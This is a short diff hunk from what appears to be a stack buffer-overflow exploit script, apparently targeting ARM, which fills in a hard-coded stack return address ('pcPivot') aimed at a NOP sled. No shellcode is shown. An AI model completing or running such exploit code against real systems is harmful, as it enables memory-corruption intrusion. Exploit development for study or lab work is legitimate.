@@ -27,7 +27,7 @@ nop	= '\x01\x30\x8f\xe2'
 nops	= nop * 8
 
 # Set this to somewhere in the middle of your nops on the stack
-pcPivot = ######
+pcPivot = '\xdc\xf1\xff\xbe'
 
 # If we need overflow set it here
 # format is decimal in bytes
